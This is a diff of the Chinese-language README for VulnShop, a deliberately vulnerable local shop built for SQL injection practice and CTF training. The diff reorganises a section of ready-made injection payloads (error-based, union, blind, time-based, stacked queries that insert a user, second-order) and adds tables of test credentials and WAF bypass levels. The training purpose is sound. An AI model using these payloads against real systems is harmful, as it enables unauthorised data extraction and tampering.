@@ -1,4 +1,4 @@
-# VulnShop - SQL注入测试靶场
+# VulnShop - SQL 注入测试靶场
 
 ```
 ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗██╗  ██╗ ██████╗ ██████╗ 
@@ -9,42 +9,49 @@
   ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     
 ```
 
-**一个专门用于SQL注入测试和学习的漏洞靶场**
+**一个专门用于 SQL 注入测试和学习的漏洞靶场**
 
 > ⚠️ **警告**: 此系统仅供安全测试和教育目的使用！禁止用于非法用途！
 
 ## 📖 简介
 
-VulnShop 是一个模拟线上商店的SQL注入测试靶场，专门设计用于：
+VulnShop 是一个模拟线上商店的 SQL 注入测试靶场，专门设计用于：
 
-- 🎓 **学习SQL注入**: 了解各种SQL注入类型的原理和利用方式
-- 🔧 **测试工具**: 测试sqlmap、Burp Suite等安全工具的功能
-- 📝 **安全培训**: 作为安全培训和CTF比赛的练习环境
+- 🎓 **学习 SQL 注入**: 了解各种 SQL 注入类型的原理和利用方式
+- 🔧 **测试安全工具**: 测试 SQLMap、Burp Suite 等安全工具的功能
+- 📝 **安全培训**: 作为安全培训和 CTF 比赛的练习环境
 
 ## ✨ 特性
 
-### 支持的SQL注入类型
+### 现代化 UI
+- 🎨 响应式设计，适配各种屏幕
+- 🌓 支持亮色/暗色主题切换
+- 🛒 完整的电商购物流程模拟
+
+### 支持的 SQL 注入类型
 
 | 类型 | 接口 | 说明 |
 |------|------|------|
-| **Error-based** | POST /api/user/login | 基于错误的注入，返回详细SQL错误信息 |
+| **Error-based** | POST /api/user/login | 基于错误的注入，返回详细 SQL 错误信息 |
 | **Union-based** | GET /api/user/profile | 联合查询注入，可提取其他表数据 |
-| **Boolean-based Blind** | GET /api/products/search | 布尔盲注，通过响应差异判断 |
-| **Time-based Blind** | GET /api/products/detail | 时间盲注，通过响应时间判断 |
-| **Stacked Queries** | GET /api/orders/query | 堆叠查询，可执行多条SQL语句 |
+| **Boolean-blind** | GET /api/products/search | 布尔盲注，通过响应差异判断 |
+| **Time-based** | GET /api/products/detail | 时间盲注，通过响应时间判断 |
+| **Stacked Queries** | GET /api/orders/query | 堆叠查询，可执行多条 SQL 语句 |
 | **Second-order** | POST /api/user/register | 二次注入，存储后在其他位置触发 |
 
-### 难度级别
+### WAF 难度级别
 
-- **Easy**: 无任何防护，所有注入类型都可用
-- **Medium**: 简单WAF过滤，可通过大小写/编码绕过
-- **Hard**: 严格WAF过滤，需要高级绕过技术
+| 级别 | 防护措施 | 绕过难度 |
+|------|----------|----------|
+| **Easy** | 无任何防护 | 直接注入 |
+| **Medium** | 简单关键字过滤 | 大小写混合、URL 编码 |
+| **Hard** | 严格 WAF 过滤 | 高级绕过技术 |
 
 ### 技术栈
 
-- **后端**: Python 3 + 内置HTTP Server
+- **后端**: Python 3 + Flask
 - **数据库**: SQLite3
-- **前端**: 纯HTML + CSS + JavaScript
+- **前端**: 纯 HTML + CSS + JavaScript
 - **无需外部依赖**，开箱即用
 
 ## 🚀 快速开始
@@ -52,12 +59,18 @@ VulnShop 是一个模拟线上商店的SQL注入测试靶场，专门设计用�
 ### 环境要求
 
 - Python 3.7+
+- Flask (`pip install flask`)
 - 仅支持本地访问（127.0.0.1）
 
 ### 启动服务
 
 ```bash
 cd src/vulnTestServer
+
+# 安装依赖
+pip install flask
+
+# 启动服务
 python server.py
 ```
 
@@ -66,14 +79,67 @@ python server.py
 ### 访问靶场
 
 1. 打开浏览器访问 http://127.0.0.1:9527
-2. 使用测试账户登录：
-   - 管理员: `admin` / `admin123`
-   - 普通用户: `test` / `test`
+2. 使用测试账户登录
 
-## 📚 详细文档
+## 👥 测试账户
 
-- [使用说明](doc/USAGE.md) - 详细的使用指南和测试方法
-- [免责声明](doc/DISCLAIMER.md) - 法律声明和使用条款
+| 用户名 | 密码 | 角色 |
+|--------|------|------|
+| admin | admin123 | 管理员 |
+| test | test | 普通用户 |
+| alice | alice123 | 普通用户 |
+| bob | bob456 | 普通用户 |
+
+## 🎯 测试示例
+
+### Error-based 注入
+
+```http
+POST /api/user/login
+Content-Type: application/json
+
+{
+  "username": "admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--",
+  "password": "x"
+}
+```
+
+### Union-based 注入
+
+```http
+GET /api/user/profile?id=1 UNION SELECT 1,flag,description,4,5,6 FROM secrets--
+```
+
+### Boolean-blind 盲注
+
+```http
+GET /api/products/search?keyword=test' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a'--
+```
+
+### Time-based 盲注
+
+```http
+GET /api/products/detail?id=1 AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)
+```
+
+### Stacked Queries
+
+```http
+GET /api/orders/query?order_no=ORD001'; INSERT INTO users(username,password,email) VALUES('hacker','pwned','h@h.com');--
+```
+
+### Second-order 注入
+
+```http
+POST /api/user/register
+Content-Type: application/json
+
+{
+  "username": "admin'--",
+  "password": "test",
+  "email": "test@test.com"
+}
+```
 
 ## 🛠️ 配置
 
@@ -83,75 +149,100 @@ python server.py
 
 ```python
 HOST = "127.0.0.1"  # 仅允许本地访问
-PORT = 9527          # 修改此处更改端口
+PORT = 9527         # 修改此处更改端口
 ```
 
 ### 切换难度
 
-1. 通过Web界面: 访问"配置"页面
-2. 通过API: `POST /api/config` 发送 `{"difficulty": "medium"}`
-3. 修改配置文件: 编辑 `config.py` 中的 `DIFFICULTY`
+1. **Web 界面**: 访问「系统配置」页面
+2. **API**: `POST /api/config` 发送 `{"difficulty": "medium"}`
+3. **配置文件**: 编辑 `config.py` 中的 `DIFFICULTY`
 
 ### 重置数据库
 
-1. 通过Web界面: 访问"配置"页面点击"重置数据库"
-2. 通过命令行: `python database.py`
-
-## 🎯 测试示例
-
-### Error-based 注入
-
-```
-POST /api/user/login
-Content-Type: application/json
-
-{"username": "admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--", "password": "x"}
-```
-
-### Union-based 注入
-
-```
-GET /api/user/profile?id=1 UNION SELECT 1,flag,description,4,5,6 FROM secrets--
-```
-
-### Boolean-based 盲注
-
-```
-GET /api/products/search?keyword=test' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a'--
-```
-
-### Time-based 盲注
-
-```
-GET /api/products/detail?id=1 AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)
-```
-
-### Stacked Queries
-
-```
-GET /api/orders/query?order_no=ORD20231201001'; INSERT INTO users(username,password,email) VALUES('hacker','hacked','h@h.com');--
-```
+1. **Web 界面**: 访问「系统配置」页面点击「重置数据库」
+2. **命令行**: `python database.py`
 
 ## 📊 数据库结构
 
 ### users 表
-- id, username, password, email, phone, address, balance, is_admin, created_at
+| 字段 | 类型 | 说明 |
+|------|------|------|
+| id | INTEGER | 主键 |
+| username | TEXT | 用户名 |
+| password | TEXT | 密码 |
+| email | TEXT | 邮箱 |
+| phone | TEXT | 电话 |
+| address | TEXT | 地址 |
+| balance | REAL | 余额 |
+| is_admin | INTEGER | 是否管理员 |
+| created_at | TEXT | 创建时间 |
 
 ### products 表
-- id, name, description, price, stock, category, image, is_active, created_at
+| 字段 | 类型 | 说明 |
+|------|------|------|
+| id | INTEGER | 主键 |
+| name | TEXT | 商品名称 |
+| description | TEXT | 商品描述 |
+| price | REAL | 价格 |
+| stock | INTEGER | 库存 |
+| category | TEXT | 分类 |
+| image | TEXT | 图片 |
+| is_active | INTEGER | 是否上架 |
+| created_at | TEXT | 创建时间 |
 
 ### orders 表
-- id, user_id, product_id, quantity, total_price, status, shipping_address, order_no, created_at
+| 字段 | 类型 | 说明 |
+|------|------|------|
+| id | INTEGER | 主键 |
+| user_id | INTEGER | 用户ID |
+| product_id | INTEGER | 商品ID |
+| quantity | INTEGER | 数量 |
+| total_price | REAL | 总价 |
+| status | TEXT | 订单状态 |
+| shipping_address | TEXT | 收货地址 |
+| order_no | TEXT | 订单号 |
+| created_at | TEXT | 创建时间 |
 
-### secrets 表
-- id, flag, description, created_at
+### secrets 表 (CTF Flag)
+| 字段 | 类型 | 说明 |
+|------|------|------|
+| id | INTEGER | 主键 |
+| flag | TEXT | CTF Flag |
+| description | TEXT | 描述 |
+| created_at | TEXT | 创建时间 |
+
+## 📁 项目结构
+
+```
+vulnTestServer/
+├── server.py         # HTTP 服务器主程序
+├── database.py       # 数据库管理（初始化/重置）
+├── waf.py            # WAF 模块（难度控制）
+├── config.py         # 配置文件
+├── static/           # 前端静态资源
+│   ├── index.html    # 单页应用入口
+│   ├── css/
+│   │   └── style.css # 样式表（支持主题）
+│   └── js/
+│       └── app.js    # 前端 JavaScript
+├── doc/
+│   ├── USAGE.md      # 详细使用说明
+│   └── DISCLAIMER.md # 免责声明
+└── README.md
+```
 
 ## ⚠️ 安全须知
 
-1. **仅在本地使用**: 服务仅绑定127.0.0.1，禁止暴露到公网
+1. **仅在本地使用**: 服务仅绑定 127.0.0.1，禁止暴露到公网
 2. **测试环境隔离**: 不要在生产环境或重要系统上运行
 3. **合法使用**: 仅用于授权的安全测试和学习目的
 4. **及时关闭**: 不使用时请关闭服务
+
+## 📚 详细文档
+
+- [使用说明](doc/USAGE.md) - 详细的使用指南和测试方法
+- [免责声明](doc/DISCLAIMER.md) - 法律声明和使用条款
 
 ## 📝 许可证
 
